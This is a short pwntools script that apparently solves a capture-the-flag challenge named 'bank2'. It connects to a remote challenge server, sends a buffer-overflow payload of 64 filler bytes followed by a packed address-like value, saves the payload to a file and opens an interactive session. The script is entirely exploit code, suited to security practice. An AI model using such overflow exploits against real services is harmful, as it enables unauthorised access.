from pwn import *

binary = context.binary = ELF('./bank2')

#p = process('./bank2')
p = remote('61.28.237.24','30203')

payload = b'A'*64
payload += p32(0x66A44)

p.sendline(payload)

f = open('solve.txt','wb')
f.write(payload)

p.interactive()